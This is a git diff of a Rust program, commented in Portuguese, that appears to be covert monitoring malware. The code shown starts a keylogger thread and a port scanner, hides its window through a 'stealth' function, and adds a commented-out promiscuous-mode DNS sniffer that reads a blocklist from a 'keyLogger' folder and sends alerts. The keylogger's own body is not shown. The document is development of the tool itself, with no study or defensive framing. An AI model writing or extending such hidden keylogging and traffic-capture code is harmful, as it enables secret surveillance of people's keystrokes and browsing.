@@ -31,6 +31,12 @@ use std::sync::{Arc, Mutex};
 use tokio::net::TcpStream;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::runtime::Runtime;
+//extern crate pcap;
+//extern crate dns_parser;
+//use std::collections::HashSet;
+//use std::io::{self, BufRead};
+//use pcap::{Device, Packet};
+//use pcap::Capture;
 
 
 async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
@@ -51,13 +57,17 @@ async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
         rt.block_on(keylogger());
     });
 
+    //let sniffer_handle = thread::spawn(|| {
+    //    println!("Iniciou a thread do sniffer");
+    //    let rt = Runtime::new().unwrap();
+    //    rt.block_on(sniffer());
+    //});
+
     scanner_handle.join().unwrap();
     keylogger_handle.join().unwrap();
+    //sniffer_handle.join().unwrap();
 
     loop {
-        // Resto do código...
-
-        // Aguardar um intervalo
         thread::sleep(Duration::from_secs(1));
     }
 }
@@ -70,6 +80,45 @@ fn main() {
         .unwrap()
         .block_on(main_async());
 }
+
+//fn read_blocked_sites(filename: &str) -> io::Result<HashSet<String>> {
+//    let file = File::open(filename)?;
+//    let reader = io::BufReader::new(file);
+//    let blocked_sites: HashSet<String> = reader.lines().map(|line| line.unwrap()).collect();
+//    Ok(blocked_sites)
+//}
+
+//async fn sniffer() -> io::Result<()> {
+//    let blocked_sites = read_blocked_sites("C:\\keyLogger\\sites.txt")?;
+//    let logs: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(vec![]));
+//
+//    let sniffer_logs = logs.clone();
+//
+//    let device = Device::lookup().unwrap();
+//    let mut cap = Capture::from_device(device).unwrap()
+//        .promisc(true)
+//        .snaplen(65535)
+//        .open()
+//        .unwrap();
+//
+//    while let Ok(packet) = cap.next() {
+//        sniffer_handler(packet.data, &blocked_sites, &sniffer_logs);
+//    }
+//
+//    Ok(())
+//}
+//
+//fn sniffer_handler(pkt: &[u8], blocked_sites: &HashSet<String>, logs: &Arc<Mutex<Vec<String>>>) {
+//    if let Ok(dns_packet) = dns_parser::Packet::parse(pkt) {
+//        if let Some(query) = dns_packet.questions.get(0) {
+//            let query_str = query.qname.to_string();
+//            if blocked_sites.contains(&query_str) {
+//                let log = format!("Alerta gerado pelo seguinte DNS: {}", query_str);
+//                send_alert(log.as_str());
+//            }
+//        }
+//    }
+//}
 
 // Max IP Port.
 const MAX: u16 = 9000;
@@ -167,11 +216,6 @@ fn stealth() {
         user32::ShowWindow(stealth, 0);
     }
 }
-
-fn sniffer(tx: std::sync::mpsc::Sender<String>) {
-    // Resto do código...
-}
-
 
 async fn update_aux_data() -> Result<(), Box<dyn std::error::Error>> {
     // Fazer login e obter o token
